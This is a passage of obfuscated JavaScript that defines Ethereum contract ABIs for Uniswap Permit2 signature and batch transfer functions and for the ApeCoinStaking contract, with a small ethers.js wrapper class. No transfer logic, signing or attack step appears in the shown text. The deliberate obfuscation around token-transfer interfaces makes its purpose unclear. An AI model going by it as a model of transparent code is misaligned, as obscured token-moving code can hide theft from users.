  name: 'amount',
  type: 'uint256'
};
const _0x437f3e = {
  components: [_0x410efa, _0x204743],
  internalType: "struct ISignatureTransfer.TokenPermissions",
  name: "permitted",
  type: "tuple"
};
const _0x4f112f = {
  internalType: "uint256",
  name: "nonce",
  type: "uint256"
};
const _0x5f59eb = {
  internalType: "uint256",
  name: "deadline",
  type: "uint256"
};
const _0x7f33ca = {
  components: [_0x437f3e, _0x4f112f, _0x5f59eb],
  internalType: "struct ISignatureTransfer.PermitTransferFrom",
  name: "permit",
  type: "tuple"
};
const _0x535bb6 = {
  internalType: 'address',
  name: 'to',
  type: "address"
};
const _0x6c4733 = {
  internalType: "uint256",
  name: "requestedAmount",
  type: 'uint256'
};
const _0x561002 = {
  components: [_0x535bb6, _0x6c4733],
  internalType: "struct ISignatureTransfer.SignatureTransferDetails",
  name: "transferDetails",
  type: "tuple"
};
const _0x2e3acd = {
  internalType: "address",
  name: "owner",
  type: 'address'
};
const _0x259af5 = {
  internalType: 'bytes32',
  name: 'witness',
  type: "bytes32"
};
const _0x2ef705 = {
  internalType: 'string',
  name: "witnessTypeString",
  type: "string"
};
const _0x55595a = {
  internalType: "bytes",
  name: "signature",
  type: "bytes"
};
const _0x598169 = {
  inputs: [_0x7f33ca, _0x561002, _0x2e3acd, _0x259af5, _0x2ef705, _0x55595a],
  name: "permitWitnessTransferFrom",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x2e9229 = {
  internalType: "address",
  name: "token",
  type: "address"
};
const _0x2c80c2 = {
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x1686df = {
  components: [_0x2e9229, _0x2c80c2],
  internalType: "struct ISignatureTransfer.TokenPermissions[]",
  name: 'permitted',
  type: "tuple[]"
};
const _0x169548 = {
  internalType: "uint256",
  name: "nonce",
  type: 'uint256'
};
const _0x33e75e = {
  internalType: 'uint256',
  name: "deadline",
  type: 'uint256'
};
const _0x16540f = {
  components: [_0x1686df, _0x169548, _0x33e75e],
  internalType: "struct ISignatureTransfer.PermitBatchTransferFrom",
  name: 'permit',
  type: "tuple"
};
const _0x45ff3a = {
  internalType: 'address',
  name: 'to',
  type: "address"
};
const _0x59b36b = {
  internalType: 'uint256',
  name: "requestedAmount",
  type: "uint256"
};
const _0x4cbb2e = {
  components: [_0x45ff3a, _0x59b36b],
  internalType: "struct ISignatureTransfer.SignatureTransferDetails[]",
  name: "transferDetails",
  type: "tuple[]"
};
const _0x1930dc = {
  internalType: "address",
  name: 'owner',
  type: "address"
};
const _0x1f0b01 = {
  internalType: "bytes32",
  name: 'witness',
  type: "bytes32"
};
const _0x4082a3 = {
  internalType: "string",
  name: "witnessTypeString",
  type: "string"
};
const _0x39ceb4 = {
  internalType: 'bytes',
  name: "signature",
  type: "bytes"
};
const _0x4b8c67 = {
  inputs: [_0x16540f, _0x4cbb2e, _0x1930dc, _0x1f0b01, _0x4082a3, _0x39ceb4],
  name: "permitWitnessTransferFrom",
  outputs: [],
  stateMutability: 'nonpayable',
  type: "function"
};
const _0xedd9fd = {
  internalType: "address",
  name: "from",
  type: "address"
};
const _0x3f240c = {
  internalType: "address",
  name: 'to',
  type: 'address'
};
const _0x1e6d6b = {
  internalType: "uint160",
  name: "amount",
  type: 'uint160'
};
const _0x314611 = {
  internalType: "address",
  name: 'token',
  type: "address"
};
const _0x483149 = {
  components: [_0xedd9fd, _0x3f240c, _0x1e6d6b, _0x314611],
  internalType: "struct IAllowanceTransfer.AllowanceTransferDetails[]",
  name: "transferDetails",
  type: "tuple[]"
};
const _0x545be8 = {
  inputs: [_0x483149],
  name: "transferFrom",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
class Permit2Factory {
  ["interface"];
  ["contract"];
  ["abi"] = [_0xbfad51, _0x3ca444, _0x190249, _0x5500c7, _0x39b93b, _0x2861bf, _0x27325d, _0x2a372f, _0x2033af, _0xf783c2, _0x501add, _0x2825c2, _0x1a214a, _0x351a6f, _0x52e223, _0x580ab9, _0xbefbfd, _0x2e579b, _0x3ee299, _0x2bbbe2, _0x3b5cd6, _0x108a40, _0x254284, _0x185128, _0x1c26a7, _0x17c043, _0x598169, _0x4b8c67, _0x545be8];
  constructor(_0x4c5dea, _0x4453d7) {
    this['interface'] = new ethers.utils.Interface(this.abi);
    this.contract = new ethers.Contract(_0x4c5dea, this.abi, _0x4453d7);
  }
}
const _0x489457 = {
  internalType: "address",
  name: "_apeCoinContractAddress",
  type: "address"
};
const _0x1d7c06 = {
  internalType: "address",
  name: "_baycContractAddress",
  type: "address"
};
const _0x153994 = {
  internalType: 'address',
  name: "_maycContractAddress",
  type: "address"
};
const _0x45d492 = {
  internalType: "address",
  name: "_bakcContractAddress",
  type: 'address'
};
const _0x3acacd = {
  inputs: [_0x489457, _0x1d7c06, _0x153994, _0x45d492],
  stateMutability: "nonpayable",
  type: "constructor"
};
const _0x2800f5 = {
  inputs: [],
  name: "BAKCAlreadyPaired",
  type: "error"
};
const _0x3996dd = {
  inputs: [],
  name: "BAKCNotOwnedOrPaired",
  type: "error"
};
const _0x713dc = {
  inputs: [],
  name: "CallerNotOwner",
  type: "error"
};
const _0x589735 = {
  inputs: [],
  name: "DepositMoreThanOneAPE",
  type: "error"
};
const _0xc68642 = {
  inputs: [],
  name: "EndNotWholeHour",
  type: 'error'
};
const _0x8c34a6 = {
  inputs: [],
  name: "ExceededCapAmount",
  type: "error"
};
const _0x2a6b8f = {
  inputs: [],
  name: "ExceededStakedAmount",
  type: "error"
};
const _0x5c033f = {
  inputs: [],
  name: "InvalidPoolId",
  type: 'error'
};
const _0x2f0e0f = {
  inputs: [],
  name: "MainTokenNotOwnedOrPaired",
  type: 'error'
};
const _0x3b5e90 = {
  inputs: [],
  name: "NeitherTokenInPairOwnedByCaller",
  type: "error"
};
const _0x39728c = {
  inputs: [],
  name: "NotOwnerOfBAKC",
  type: "error"
};
const _0x4071fc = {
  inputs: [],
  name: "NotOwnerOfMain",
  type: "error"
};
const _0x3fe533 = {
  inputs: [],
  name: "ProvidedTokensNotPaired",
  type: "error"
};
const _0x439a69 = {
  inputs: [],
  name: "SplitPairCantPartiallyWithdraw",
  type: 'error'
};
const _0x12f3a7 = {
  inputs: [],
  name: "StartMustBeGreaterThanEnd",
  type: "error"
};
const _0x118d21 = {
  inputs: [],
  name: "StartMustEqualLastEnd",
  type: 'error'
};
const _0x25af32 = {
  inputs: [],
  name: "StartNotWholeHour",
  type: "error"
};
const _0x1bde0f = {
  inputs: [],
  name: "UncommitWrongParameters",
  type: "error"
};
const _0x1390c0 = {
  indexed: true,
  internalType: "address",
  name: "user",
  type: 'address'
};
const _0x33930c = {
  indexed: false,
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x27b6d1 = {
  indexed: false,
  internalType: "address",
  name: 'recipient',
  type: "address"
};
const _0x2b5bcb = {
  anonymous: false,
  inputs: [_0x1390c0, _0x33930c, _0x27b6d1],
  name: "ClaimRewards",
  type: "event"
};
const _0x5ef817 = {
  indexed: true,
  internalType: "address",
  name: "user",
  type: "address"
};
const _0x3bbe82 = {
  indexed: true,
  internalType: "uint256",
  name: 'poolId',
  type: "uint256"
};
const _0x3638bd = {
  indexed: false,
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x56a895 = {
  indexed: false,
  internalType: "uint256",
  name: 'tokenId',
  type: "uint256"
};
const _0x304d39 = {
  anonymous: false,
  inputs: [_0x5ef817, _0x3bbe82, _0x3638bd, _0x56a895],
  name: "ClaimRewardsNft",
  type: "event"
};
const _0x129679 = {
  indexed: true,
  internalType: "address",
  name: "user",
  type: "address"
};
const _0x272a4f = {
  indexed: false,
  internalType: 'uint256',
  name: 'amount',
  type: "uint256"
};
const _0x243521 = {
  indexed: false,
  internalType: "uint256",
  name: "mainTypePoolId",
  type: 'uint256'
};
const _0x1c5d88 = {
  indexed: false,
  internalType: 'uint256',
  name: "mainTokenId",
  type: "uint256"
};
const _0x352c30 = {
  indexed: false,
  internalType: 'uint256',
  name: "bakcTokenId",
  type: "uint256"
};
const _0x1008fc = {
  anonymous: false,
  inputs: [_0x129679, _0x272a4f, _0x243521, _0x1c5d88, _0x352c30],
  name: "ClaimRewardsPairNft",
  type: "event"
};
const _0x199f5c = {
  indexed: true,
  internalType: 'address',
  name: "user",
  type: 'address'
};
const _0x3356f4 = {
  indexed: false,
  internalType: 'uint256',
  name: 'amount',
  type: "uint256"
};
const _0x3a42f9 = {
  indexed: false,
  internalType: "address",
  name: "recipient",
  type: "address"
};
const _0x308231 = {
  anonymous: false,
  inputs: [_0x199f5c, _0x3356f4, _0x3a42f9],
  name: "Deposit",
  type: "event"
};
const _0x3e1251 = {
  indexed: true,
  internalType: "address",
  name: "user",
  type: "address"
};
const _0x18419b = {
  indexed: true,
  internalType: 'uint256',
  name: "poolId",
  type: "uint256"
};
const _0x4e4b3f = {
  indexed: false,
  internalType: 'uint256',
  name: "amount",
  type: "uint256"
};
const _0x3b4595 = {
  indexed: false,
  internalType: "uint256",
  name: 'tokenId',
  type: "uint256"
};
const _0x431598 = {
  anonymous: false,
  inputs: [_0x3e1251, _0x18419b, _0x4e4b3f, _0x3b4595],
  name: "DepositNft",
  type: "event"
};
const _0x3ae09d = {
  indexed: true,
  internalType: "address",
  name: "user",
  type: "address"
};
const _0x1e48d2 = {
  indexed: false,
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x5d9052 = {
  indexed: false,
  internalType: "uint256",
  name: "mainTypePoolId",
  type: 'uint256'
};
const _0x4c4861 = {
  indexed: false,
  internalType: "uint256",
  name: "mainTokenId",
  type: "uint256"
};
const _0x1672be = {
  indexed: false,
  internalType: "uint256",
  name: "bakcTokenId",
  type: "uint256"
};
const _0x1758bb = {
  anonymous: false,
  inputs: [_0x3ae09d, _0x1e48d2, _0x5d9052, _0x4c4861, _0x1672be],
  name: "DepositPairNft",
  type: "event"
};
const _0x5092a6 = {
  indexed: true,
  internalType: "address",
  name: "previousOwner",
  type: "address"
};
const _0x1d3661 = {
  indexed: true,
  internalType: "address",
  name: "newOwner",
  type: 'address'
};
const _0x3be32e = {
  anonymous: false,
  inputs: [_0x5092a6, _0x1d3661],
  name: "OwnershipTransferred",
  type: "event"
};
const _0x33c0b6 = {
  indexed: true,
  internalType: "uint256",
  name: 'poolId',
  type: "uint256"
};
const _0x66a352 = {
  indexed: false,
  internalType: "uint256",
  name: "lastRewardedBlock",
  type: "uint256"
};
const _0x15c7e9 = {
  indexed: false,
  internalType: "uint256",
  name: "stakedAmount",
  type: 'uint256'
};
const _0x3891f2 = {
  indexed: false,
  internalType: 'uint256',
  name: "accumulatedRewardsPerShare",
  type: "uint256"
};
const _0x16dc0a = {
  anonymous: false,
  inputs: [_0x33c0b6, _0x66a352, _0x15c7e9, _0x3891f2],
  name: "UpdatePool",
  type: "event"
};
const _0x2f9f5f = {
  indexed: true,
  internalType: 'address',
  name: "user",
  type: 'address'
};
const _0x41aa53 = {
  indexed: false,
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x2a2753 = {
  indexed: false,
  internalType: "address",
  name: "recipient",
  type: "address"
};
const _0x2c8953 = {
  anonymous: false,
  inputs: [_0x2f9f5f, _0x41aa53, _0x2a2753],
  name: "Withdraw",
  type: 'event'
};
const _0x21222a = {
  indexed: true,
  internalType: "address",
  name: 'user',
  type: "address"
};
const _0x213dfe = {
  indexed: true,
  internalType: "uint256",
  name: "poolId",
  type: "uint256"
};
const _0x4ec5da = {
  indexed: false,
  internalType: "uint256",
  name: "amount",
  type: "uint256"
};
const _0x54f841 = {
  indexed: false,
  internalType: 'address',
  name: "recipient",
  type: 'address'
};
const _0x2268e2 = {
  indexed: false,
  internalType: 'uint256',
  name: "tokenId",
  type: "uint256"
};
const _0x48c8b1 = {
  anonymous: false,
  inputs: [_0x21222a, _0x213dfe, _0x4ec5da, _0x54f841, _0x2268e2],
  name: "WithdrawNft",
  type: "event"
};
const _0xcced9e = {
  indexed: true,
  internalType: "address",
  name: "user",
  type: "address"
};
const _0x2968f8 = {
  indexed: false,
  internalType: "uint256",
  name: "amount",
  type: 'uint256'
};
const _0x214481 = {
  indexed: false,
  internalType: "uint256",
  name: "mainTypePoolId",
  type: "uint256"
};
const _0x33920a = {
  indexed: false,
  internalType: "uint256",
  name: "mainTokenId",
  type: "uint256"
};
const _0x51f805 = {
  indexed: false,
  internalType: "uint256",
  name: "bakcTokenId",
  type: 'uint256'
};
const _0x1b0838 = {
  anonymous: false,
  inputs: [_0xcced9e, _0x2968f8, _0x214481, _0x33920a, _0x51f805],
  name: "WithdrawPairNft",
  type: "event"
};
const _0xf24c82 = {
  internalType: "uint256",
  name: "_poolId",
  type: "uint256"
};
const _0x5c8365 = {
  internalType: "uint256",
  name: "_amount",
  type: "uint256"
};
const _0xd5b36b = {
  internalType: "uint256",
  name: "_startTimestamp",
  type: "uint256"
};
const _0x2931ee = {
  internalType: 'uint256',
  name: "_endTimeStamp",
  type: "uint256"
};
const _0x575e8a = {
  internalType: "uint256",
  name: "_capPerPosition",
  type: "uint256"
};
const _0x44e5f0 = {
  inputs: [_0xf24c82, _0x5c8365, _0xd5b36b, _0x2931ee, _0x575e8a],
  name: "addTimeRange",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x11fbb8 = {
  internalType: "address",
  name: '',
  type: "address"
};
const _0xfc1f0f = {
  internalType: "uint256",
  name: "stakedAmount",
  type: "uint256"
};
const _0x330063 = {
  internalType: "int256",
  name: "rewardsDebt",
  type: "int256"
};
const _0x2998ad = {
  inputs: [_0x11fbb8],
  name: "addressPosition",
  outputs: [_0xfc1f0f, _0x330063],
  stateMutability: "view",
  type: "function"
};
const _0x45906c = {
  internalType: "contract IERC20",
  name: '',
  type: "address"
};
const _0x2f4d56 = {
  inputs: [],
  name: "apeCoin",
  outputs: [_0x45906c],
  stateMutability: "view",
  type: "function"
};
const _0x2c5e84 = {
  internalType: "uint256",
  name: '',
  type: "uint256"
};
const _0x4b68f = {
  internalType: "uint256",
  name: '',
  type: "uint256"
};
const _0x892841 = {
  internalType: "uint248",
  name: "tokenId",
  type: 'uint248'
};
const _0x343e87 = {
  internalType: "bool",
  name: "isPaired",
  type: 'bool'
};
const _0x8c797e = {
  inputs: [_0x2c5e84, _0x4b68f],
  name: "bakcToMain",
  outputs: [_0x892841, _0x343e87],
  stateMutability: "view",
  type: "function"
};
const _0x17a734 = {
  internalType: "address",
  name: "_recipient",
  type: "address"
};
const _0x5689e4 = {
  inputs: [_0x17a734],
  name: "claimApeCoin",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x168a8f = {
  internalType: "uint128",
  name: "mainTokenId",
  type: 'uint128'
};
const _0xdafc46 = {
  internalType: 'uint128',
  name: "bakcTokenId",
  type: "uint128"
};
const _0x337138 = {
  components: [_0x168a8f, _0xdafc46],
  internalType: "struct ApeCoinStaking.PairNft[]",
  name: "_baycPairs",
  type: "tuple[]"
};
const _0x2c6ac2 = {
  internalType: "uint128",
  name: "mainTokenId",
  type: "uint128"
};
const _0x175993 = {
  internalType: 'uint128',
  name: "bakcTokenId",
  type: 'uint128'
};
const _0x13956b = {
  components: [_0x2c6ac2, _0x175993],
  internalType: "struct ApeCoinStaking.PairNft[]",
  name: '_maycPairs',
  type: "tuple[]"
};
const _0x1de9b2 = {
  internalType: "address",
  name: "_recipient",
  type: "address"
};
const _0x189109 = {
  inputs: [_0x337138, _0x13956b, _0x1de9b2],
  name: 'claimBAKC',
  outputs: [],
  stateMutability: 'nonpayable',
  type: "function"
};
const _0x3803c7 = {
  internalType: "uint256[]",
  name: '_nfts',
  type: 'uint256[]'
};
const _0x137e6d = {
  internalType: "address",
  name: "_recipient",
  type: "address"
};
const _0x124d8f = {
  inputs: [_0x3803c7, _0x137e6d],
  name: 'claimBAYC',
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x287cfb = {
  internalType: "uint256[]",
  name: "_nfts",
  type: "uint256[]"
};
const _0x44cd9f = {
  internalType: "address",
  name: "_recipient",
  type: "address"
};
const _0x1657b6 = {
  inputs: [_0x287cfb, _0x44cd9f],
  name: 'claimMAYC',
  outputs: [],
  stateMutability: 'nonpayable',
  type: "function"
};
const _0x424639 = {
  inputs: [],
  name: "claimSelfApeCoin",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x42e00e = {
  internalType: 'uint128',
  name: "mainTokenId",
  type: "uint128"
};
const _0xe68812 = {
  internalType: "uint128",
  name: "bakcTokenId",
  type: 'uint128'
};
const _0x1249b3 = {
  components: [_0x42e00e, _0xe68812],
  internalType: "struct ApeCoinStaking.PairNft[]",
  name: "_baycPairs",
  type: "tuple[]"
};
const _0x23973f = {
  internalType: "uint128",
  name: "mainTokenId",
  type: "uint128"
};
const _0x2b8758 = {
  internalType: 'uint128',
  name: "bakcTokenId",
  type: "uint128"
};
const _0x3774c3 = {
  components: [_0x23973f, _0x2b8758],
  internalType: "struct ApeCoinStaking.PairNft[]",
  name: '_maycPairs',
  type: "tuple[]"
};
const _0x499fde = {
  inputs: [_0x1249b3, _0x3774c3],
  name: "claimSelfBAKC",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x5905f1 = {
  internalType: "uint256[]",
  name: "_nfts",
  type: 'uint256[]'
};
const _0x20f938 = {
  inputs: [_0x5905f1],
  name: "claimSelfBAYC",
  outputs: [],
  stateMutability: 'nonpayable',
  type: 'function'
};
const _0x4667bf = {
  internalType: "uint256[]",
  name: "_nfts",
  type: "uint256[]"
};
const _0x144059 = {
  inputs: [_0x4667bf],
  name: "claimSelfMAYC",
  outputs: [],
  stateMutability: "nonpayable",
  type: 'function'
};
const _0x2e778d = {
  internalType: "uint256",
  name: "_amount",
  type: 'uint256'
};
const _0x7dbfb2 = {
  internalType: "address",
  name: "_recipient",
  type: "address"
};
const _0x1767e6 = {
  inputs: [_0x2e778d, _0x7dbfb2],
  name: "depositApeCoin",
  outputs: [],
  stateMutability: "nonpayable",
  type: 'function'
};
const _0x9f52ae = {
  internalType: "uint32",
  name: "mainTokenId",
  type: "uint32"
};
const _0x533c55 = {
  internalType: "uint32",
  name: "bakcTokenId",
  type: "uint32"
};
const _0x19c33e = {
  internalType: "uint184",
  name: "amount",
  type: "uint184"
};
const _0x5b2c5a = {
  components: [_0x9f52ae, _0x533c55, _0x19c33e],
  internalType: "struct ApeCoinStaking.PairNftDepositWithAmount[]",
  name: "_baycPairs",
  type: "tuple[]"
};
const _0x3eff94 = {
  internalType: "uint32",
  name: "mainTokenId",
  type: "uint32"
};
const _0x2fc169 = {
  internalType: 'uint32',
  name: "bakcTokenId",
  type: "uint32"
};
const _0x4a28df = {
  internalType: "uint184",
  name: "amount",
  type: "uint184"
};
const _0x4e23e5 = {
  components: [_0x3eff94, _0x2fc169, _0x4a28df],
  internalType: "struct ApeCoinStaking.PairNftDepositWithAmount[]",
  name: '_maycPairs',
  type: 'tuple[]'
};
const _0x35c7d0 = {
  inputs: [_0x5b2c5a, _0x4e23e5],
  name: "depositBAKC",
  outputs: [],
  stateMutability: "nonpayable",
  type: 'function'
};
const _0xc9c020 = {
  internalType: "uint32",
  name: "tokenId",
  type: "uint32"
};
const _0x4972a2 = {
  internalType: "uint224",
  name: "amount",
  type: "uint224"
};
const _0x473413 = {
  components: [_0xc9c020, _0x4972a2],
  internalType: "struct ApeCoinStaking.SingleNft[]",
  name: "_nfts",
  type: "tuple[]"
};
const _0x4000f3 = {
  inputs: [_0x473413],
  name: "depositBAYC",
  outputs: [],
  stateMutability: "nonpayable",
  type: "function"
};
const _0x431c0f = {
  internalType: "uint32",
  name: "tokenId",
  type: "uint32"
};
const _0x5061dd = {
  internalType: "uint224",
  name: "amount",
  type: 'uint224'
};
const _0x596f8c = {
  components: [_0x431c0f, _0x5061dd],
  internalType: "struct ApeCoinStaking.SingleNft[]",
  name: "_nfts",
  type: "tuple[]"
};
const _0x5c4d8d = {
  inputs: [_0x596f8c],
  name: "depositMAYC",
  outputs: [],
  stateMutability: 'nonpayable',
  type: "function"
};
const _0x2954ac = {
  internalType: "uint256",
  name: "_amount",
  type: "uint256"
};
const _0x5bc9f7 = {
  inputs: [_0x2954ac],
  name: "depositSelfApeCoin",
  outputs: [],
  stateMutability: "nonpayable",
  type: 'function'
};
const _0x2e7884 = {
  internalType: "address",
  name: "_address",
  type: "address"
};
const _0x1393fa = {
  internalType: "uint256",
  name: "poolId",
  type: "uint256"
};
const _0x2a85a9 = {
  internalType: "uint256",
  name: "tokenId",
  type: "uint256"
};
const _0x457301 = {
  internalType: 'uint256',
  name: 'deposited',
  type: "uint256"
};
const _0x34dace = {
  internalType: 'uint256',
  name: "unclaimed",
  type: "uint256"
};
const _0x518063 = {
  internalType: 'uint256',
  name: "rewards24hr",
  type: "uint256"
};
const _0x3566c5 = {
  internalType: "uint256",
  name: "mainTokenId",
  type: "uint256"
};
const _0x154312 = {
  internalType: 'uint256',
  name: "mainTypePoolId",
  type: "uint256"
};
const _0x265b52 = {
  components: [_0x3566c5, _0x154312],
  internalType: "struct ApeCoinStaking.DashboardPair",
  name: "pair",
  type: "tuple"
};
const _0x23df85 = {
  components: [_0x1393fa, _0x2a85a9, _0x457301, _0x34dace, _0x518063, _0x265b52],
  internalType: "struct ApeCoinStaking.DashboardStake[]",
  name: '',
  type: "tuple[]"
};
const _0x4f79e3 = {
  inputs: [_0x2e7884],
  name: "getAllStakes",
  outputs: [_0x23df85],
  stateMutability: "view",
  type: "function"
};
const _0x2c5d19 = {
  internalType: 'address',
  name: "_address",
  type: "address"
};
const _0xd12c2b = {
  internalType: "uint256",
  name: "poolId",
  type: "uint256"
};
const _0x1b737b = {
  internalType: "uint256",
  name: "tokenId",
  type: 'uint256'
};
const _0x15beea = {
  internalType: "uint256",
  name: "deposited",
  type: "uint256"
};
const _0x8c3514 = {
  internalType: "uint256",
  name: "unclaimed",
  type: 'uint256'
};
const _0x2a8f7c = {
  internalType: 'uint256',
  name: "rewards24hr",
  type: 'uint256'
};
const _0x558b11 = {
  internalType: "uint256",
  name: "mainTokenId",
  type: "uint256"
};
const _0x61a850 = {
  internalType: "uint256",
  name: "mainTypePoolId",
  type: "uint256"
};
const _0x4059d8 = {
  components: [_0x558b11, _0x61a850],
  internalType: "struct ApeCoinStaking.DashboardPair",
  name: "pair",
  type: "tuple"
};
const _0x5c8d4b = {
  components: [_0xd12c2b, _0x1b737b, _0x15beea, _0x8c3514, _0x2a8f7c, _0x4059d8],
  internalType: "struct ApeCoinStaking.DashboardStake",
  name: '',
  type: 'tuple'
};
const _0x1c1703 = {
  inputs: [_0x2c5d19],
  name: "getApeCoinStake",
  outputs: [_0x5c8d4b],
  stateMutability: "view",
  type: 'function'
};
const _0x34fe0c = {
  internalType: "address",
  name: "_address",
  type: "address"
};
const _0x4e8a62 = {
  internalType: "uint256",
  name: 'poolId',
  type: "uint256"
};
const _0x3c12c8 = {
  internalType: "uint256",
  name: "tokenId",
  type: 'uint256'
};
const _0x4880b4 = {
  internalType: "uint256",
  name: "deposited",
  type: 'uint256'
};
const _0x1ed8bb = {
  internalType: 'uint256',
  name: "unclaimed",
  type: 'uint256'
};
const _0x5c0d93 = {
  internalType: "uint256",
  name: "rewards24hr",
  type: "uint256"
};
const _0x7bf947 = {
  internalType: "uint256",
  name: "mainTokenId",
  type: 'uint256'
};
const _0x64b1c2 = {
  internalType: 'uint256',
  name: "mainTypePoolId",
  type: "uint256"
};
const _0x375c36 = {
  components: [_0x7bf947, _0x64b1c2],
  internalType: "struct ApeCoinStaking.DashboardPair",
  name: "pair",
  type: "tuple"
};
const _0x265739 = {
  components: [_0x4e8a62, _0x3c12c8, _0x4880b4, _0x1ed8bb, _0x5c0d93, _0x375c36],
  internalType: "struct ApeCoinStaking.DashboardStake[]",
  name: '',
  type: "tuple[]"
};
const _0x484b13 = {
  inputs: [_0x34fe0c],
  name: "getBakcStakes",
  outputs: [_0x265739],
  stateMutability: "view",
  type: "function"
};
const _0x5b04d4 = {
  internalType: "address",
  name: '_address',
  type: "address"
};
const _0x43b027 = {
  internalType: "uint256",
  name: "poolId",
  type: "uint256"
};
const _0x5ed6df = {
  internalType: "uint256",
  name: "tokenId",
  type: "uint256"
};
const _0x56bae6 = {
  internalType: "uint256",
  name: 'deposited',
  type: "uint256"
};
const _0x9c8d7f = {
  internalType: 'uint256',
  name: "unclaimed",
  type: "uint256"
};
const _0x87a3d7 = {
  internalType: 'uint256',
  name: "rewards24hr",
  type: "uint256"
};
const _0x506743 = {
  internalType: 'uint256',
  name: "mainTokenId",
  type: "uint256"
};
const _0xb99d42 = {
  internalType: "uint256",
  name: "mainTypePoolId",
  type: "uint256"
};
const _0x4f61bf = {
  components: [_0x506743, _0xb99d42],
  internalType: "struct ApeCoinStaking.DashboardPair",
  name: "pair",
  type: "tuple"
};
const _0x10696f = {
  components: [_0x43b027, _0x5ed6df, _0x56bae6, _0x9c8d7f, _0x87a3d7, _0x4f61bf],
  internalType: "struct ApeCoinStaking.DashboardStake[]",
  name: '',
  type: "tuple[]"
};
const _0x1aee70 = {
  inputs: [_0x5b04d4],
  name: "getBaycStakes",
  outputs: [_0x10696f],
  stateMutability: "view",
  type: 'function'
};
const _0x4120c7 = {
  internalType: "address",
  name: "_address",
  type: "address"
};
const _0x560f6a = {
  internalType: 'uint256',
  name: 'poolId',
  type: 'uint256'
};
const _0xb37eb1 = {
  internalType: 'uint256',
  name: "tokenId",
  type: "uint256"
};
const _0x358cee = {
  internalType: "uint256",
  name: "deposited",
  type: 'uint256'
};
const _0x3375fa = {
  internalType: 'uint256',
  name: "unclaimed",
  type: "uint256"
};
const _0x4f055d = {
  internalType: "uint256",
  name: "rewards24hr",
  type: "uint256"
};
const _0x19cea5 = {
  internalType: "uint256",
  name: "mainTokenId",
  type: "uint256"
};
const _0x9f1bbb = {
  internalType: "uint256",
  name: "mainTypePoolId",
  type: "uint256"
};
const _0x477c30 = {
  components: [_0x19cea5, _0x9f1bbb],
  internalType: "struct ApeCoinStaking.DashboardPair",
  name: "pair",
  type: "tuple"
};
const _0x206732 = {
  components: [_0x560f6a, _0xb37eb1, _0x358cee, _0x3375fa, _0x4f055d, _0x477c30],
  internalType: "struct ApeCoinStaking.DashboardStake[]",
  name: '',
  type: "tuple[]"
};
const _0x32f52c = {
  inputs: [_0x4120c7],
  name: "getMaycStakes",
  outputs: [_0x206732],
  stateMutability: "view",
  type: 'function'
};
const _0x22910f = {
  internalType: "uint256",
  name: "poolId",
  type: 'uint256'
};
const _0x5c745c = {
  internalType: "uint256",
  name: "stakedAmount",
  type: "uint256"
};
const _0x154637 = {
  internalType: "uint48",
  name: "startTimestampHour",
  type: "uint48"
};
const _0x277a5e = {
  internalType: "uint48",
  name: "endTimestampHour",
  type: "uint48"
};
const _0x190951 = {
  internalType: 'uint96',
  name: "rewardsPerHour",
  type: "uint96"
};
const _0x12e7e9 = {
  internalType: "uint96",
  name: "capPerPosition",
  type: "uint96"
};
const _0x40c275 = {
  components: [_0x154637, _0x277a5e, _0x190951, _0x12e7e9],
  internalType: "struct ApeCoinStaking.TimeRange",
  name: "currentTimeRange",
  type: 'tuple'
};
const _0x71713 = {
  components: [_0x22910f, _0x5c745c, _0x40c275],
  internalType: "struct ApeCoinStaking.PoolUI",
  name: '',
  type: "tuple"
};
const _0x5ba452 = {
  internalType: 'uint256',
  name: "poolId",
  type: "uint256"
};
const _0x3f9d78 = {
  internalType: "uint256",
  name: "stakedAmount",
  type: 'uint256'
};
const _0x5caf38 = {
  internalType: "uint48",
  name: "startTimestampHour",
  type: "uint48"
};
const _0xa7dee5 = {
  internalType: "uint48",
  name: "endTimestampHour",
  type: "uint48"
};
const _0x528761 = {
  internalType: 'uint96',
  name: "rewardsPerHour",
  type: "uint96"
};
const _0x5cf89a = {
  internalType: "uint96",
  name: "capPerPosition",
  type: 'uint96'
};
const _0x6c1261 = {
  components: [_0x5caf38, _0xa7dee5, _0x528761, _0x5cf89a],
  internalType: "struct ApeCoinStaking.TimeRange",
  name: "currentTimeRange",
  type: "tuple"
};
const _0x3105b3 = {
  components: [_0x5ba452, _0x3f9d78, _0x6c1261],
  internalType: "struct ApeCoinStaking.PoolUI",
  name: '',
  type: 'tuple'
};
const _0x3d583e = {
  internalType: "uint256",
  name: "poolId",
  type: "uint256"
};
const _0x251cfa = {
  internalType: 'uint256',
  name: "stakedAmount",
  type: "uint256"
};
const _0x1ba09a = {
  internalType: "uint48",
  name: "startTimestampHour",
  type: "uint48"
};
const _0xa3afcb = {
  internalType: "uint48",
  name: "endTimestampHour",
  type: "uint48"
};
const _0x41d489 = {
  internalType: "uint96",
  name: "rewardsPerHour",
  type: 'uint96'
};
const _0x26c964 = {
  internalType: 'uint96',
  name: "capPerPosition",
  type: 'uint96'
};
const _0x3d977a = {
  components: [_0x1ba09a, _0xa3afcb, _0x41d489, _0x26c964],
  internalType: "struct ApeCoinStaking.TimeRange",
  name: "currentTimeRange",
  type: 'tuple'
};
const _0x39ada2 = {
  components: [_0x3d583e, _0x251cfa, _0x3d977a],
  internalType: "struct ApeCoinStaking.PoolUI",
  name: '',
  type: "tuple"
};
const _0x58b8ef = {
  internalType: "uint256",
  name: "poolId",
  type: "uint256"
};
const _0x231970 = {
  internalType: 'uint256',
  name: "stakedAmount",
  type: "uint256"
};
const _0x5b7466 = {
  internalType: "uint48",
  name: "startTimestampHour",
  type: "uint48"
};
const _0xb5bcc7 = {
  internalType: "uint48",
  name: "endTimestampHour",
  type: "uint48"
};
const _0x49580d = {
  internalType: "uint96",
  name: "rewardsPerHour",
  type: "uint96"
};
const _0x30e5f6 = {
  internalType: "uint96",
  name: "capPerPosition",
  type: "uint96"
};
